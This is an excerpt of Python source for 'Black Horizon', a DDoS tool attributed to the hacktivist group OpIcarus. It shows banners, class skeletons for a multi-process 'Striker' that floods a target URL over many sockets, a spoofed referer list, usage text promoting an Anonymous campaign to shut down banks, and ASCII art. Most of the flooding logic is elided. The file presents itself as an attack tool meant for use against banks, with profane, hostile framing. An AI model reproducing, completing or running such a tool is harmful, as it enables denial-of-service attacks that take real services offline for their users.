...
#Black Horizon iDDoS Tool Created for fucking the elite up the arse           #
###############################################################################
#####facebook.com/Anonymous-OpIcarus-Shut-Down-The-Banks-1092056780854948/#####
###############################################################################
###############################################################################
###############################################################################
...
BLACKHORIZON_BANNER = 'BlackHorizon Clound Based DDoS Tool Created By OpIcarus to fuck some banks'
...
class BlackHorizon(object):
    ...
    # Containers
    cloundsQueue = []                                                  ###############################
    manager = None                                                     #~~~~Created By OpIcarus--~~~~#
    useragents = []                                                    #~~~~~~~~~~@FollowMe~~~~~~~~~~#
                                                                       #~~~youtube.com/c/---------~~~#
    # Properties                                                       #~~~~~Twitter:----------~~~~~~#
    url = None                                                         ###############################
...
class Striker(Process):
    ...
    def __init__(self, url, nr_sockets, counter):
        ...
        self.referers = [ 
            ...
            'http://www.pastebin.com/',                                           #All uploaded by           #
            'https://www.nasa.gov/',                                              #From OpIcarus             #
...
def usage():
    ...
    print 'Opicarus page: https://www.facebook.com/Anonymous-OpIcarus-Shut-Down-The-Banks-1092056780854948/'
    print "\a"
print \
"""                                                       
           .          .           .     .                .       .
  .      .      *           .       .          .                       .
                 .       .   . *  "One day we will control our banks...
  .       ____     .      . .      never give up keep fighting"
         <WW>>>         .        .               .
 .   .  /WWWI; \  .       .    .  ____               .         .     .         
  *    /WWWWII; \=====;    .     /WI; \   *    .        /\_             .
...
########################################################################XXXXXXX
#####################################################################XXXXXXXXXX
####facebook.com/Anonymous-OpIcarus-Shut-Down-The-Banks-1092056780854948/####XX
##############################################################XXXXXXXXXXXXXXXXX
